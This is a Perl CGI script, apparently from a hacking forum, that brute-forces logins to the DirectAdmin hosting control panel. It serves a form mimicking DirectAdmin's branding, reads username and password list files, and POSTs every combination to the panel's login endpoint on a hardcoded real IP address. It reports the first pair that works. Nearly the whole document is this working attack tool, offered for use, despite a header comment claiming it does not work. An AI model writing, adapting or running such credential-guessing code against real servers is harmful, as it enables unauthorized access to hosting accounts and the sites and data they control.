#!c:\perl\bin\perl.exe
# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> This Code Not work <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
# DirectBf v1 By Or4nge.M4n  
# Home & Powered By : Sec4ever.com
# thanks to : sec4ever & n4ss1m & i-Hmx ... (:
use LWP::UserAgent;
$urlup = "188.165.74.206"; # Change here
print "Content-type: text/html\n\n";
print '
<head>
<style type="text/css">
*
{
    FONT-SIZE: 8pt;
    FONT-FAMILY: verdana;
}
 
.toptext
{
    COLOR: #BBBBBB;
}
.bottomtext
{
    COLOR: #EEEEEE;
}
 
body
{
    BACKGROUND: white;
}
 
a
{
    COLOR: black;
    TEXT-DECORATION: underline;
}
 
a:hover
{
    COLOR: #9999CC;
}
 
u
{
    TEXT-DECORATION: underline;
}
 
.tree
{
    COLOR: #DEDEDE;
}
 
.title
{
    COLOR: #000000;
    FONT-WEIGHT: bold;
    FONT-SIZE: 12pt;
}
 
.header
{
    FONT-WEIGHT: 600;
    FONT-SIZE: 10pt;
    COLOR: #123456;
}
 
.button
{
    FONT-SIZE: 12pt;
    border: 1px solid white;    
}
 
a.button
{
    TEXT-DECORATION: none;
}
 
a.button:hover
{
    TEXT-DECORATION: none;
    COLOR: black;
}
 
.highlighted
{
    border: 1px solid grey;
    border-style: outset;
    cursor: hand;
}
 
table.list
{
    BACKGROUND: #FFFFFF;
    
}
 
td.list
{
    BACKGROUND: #EEEEEE;
    white-space: nowrap;
}
 
td.listwrap
{
    BACKGROUND: #EEEEEE;
    white-space: wrap;
}
 
.listtitle
{
    BACKGROUND: #425984;
    COLOR: #EEEEEE;
    white-space: nowrap;
}
 
td.listtitle
{
    border: 1px solid grey;
    border-style: outset;
}
 
</style>
 </head>';
  if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@or4ng = split(/&/, $buffer);
foreach $m4n (@or4ng) {
  ($name, $value) = split(/=/, $m4n);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
    $textlist = $FORM{textcontent};
    $username = $FORM{user};
    #<div align="center">
if ($FORM{textcontent} eq ""){
    print '
    
    <p align="center" style="margin-top: 0; margin-bottom: 0"><img border="0" src="https://www.directadmin.com/header3.gif" width="730" height="65"></p>
    <center>
    <br><br>
 
    <b></b>
 
    <br><br>
 
    <table class=list cellspacing=1 cellpadding=5>
 
        <form method="POST">
        <tr>
            <td class=listtitle colspan=2>Please enter your List user & List Password</td>
        </tr>
        <tr>
            <td class=list align=right>List user</td>
            <td class=list><input type=text name=user ></td>
        </tr>
        <tr>
            <td class=list align=right>List Password</td>
            <td class=list><input type=text name=textcontent ></td>
        </tr>
        <tr>
            <td class=listtitle colspan=2 align=right><input type=submit value="Brutes" ></td>
        </tr>
        </form>
    </table>
    <br><br>
 
    </center>
 
    <p align="center" style="margin-top: 0; margin-bottom: 0"><img border="0" src="https://www.directadmin.com/footer.gif" width="730" height="20"></p>
<p align="center" style="margin-top: 0; margin-bottom: 0"><font face="Arial" size="1">© Copyrgiht Sec4ever.com|Or4nge.M4n </p> 
<p align="center" >Follow Me 
<p align="center" ><a href="https://twitter.com/s4udiT3rr0rist"><img src="http://cdn1.iconfinder.com/data/icons/socialmediamini/PNG/twitter.png" > </font>
    </body>';
    }else{
    open (PASSFILE, "<$textlist") || die "[-] Can't open the List of password file !";
    @PASSWORDS = <PASSFILE>;
    close PASSFILE;
    foreach my $P (@PASSWORDS) {
    chomp $P;
    $passwd = $P;
    open (USERFILE, "<$username") || die "[-] Can't open the List of users file !";
    @WORDS = <USERFILE>;
    close USERFILE;
    foreach my $us (@WORDS) {
    chomp $us;
    $user = $us;
    my $UserAgent = new LWP::UserAgent;
    my $response = $UserAgent->post("http://".$urlup.":2222/CMD_LOGIN",
    {
    "username"   => "$user",
    "password"   => "$passwd",
    "submit.x" => "89",
    "submit.y" => "19",
    "referer" => "%2F",
    });
    if ($content = $response->content=~ /Wrong Username or Password!/ ) 
    {
    print "<br><b> Not Found : <br>";
    print "<br>   <font color='GREEN'><b> [+] Password : </font>$passwd             <br>";
    print "<br>   <font color='GREEN'><b> [+] Username : </font>$user               <br>";
    print "<br> [Brutes ...]<br>";
    }else{
    print "\n   
    Found :  $urlup<br>
    <font color='#990000' face='Arial' size='3'><b>User => [ $user       ]</b></font><br>
    Pass => [ $passwd     ]<br>";
    print "<script>alert('Found User ".$user." Password ".$passwd."');</script>";
    exit();
    }
    }
    }
    }
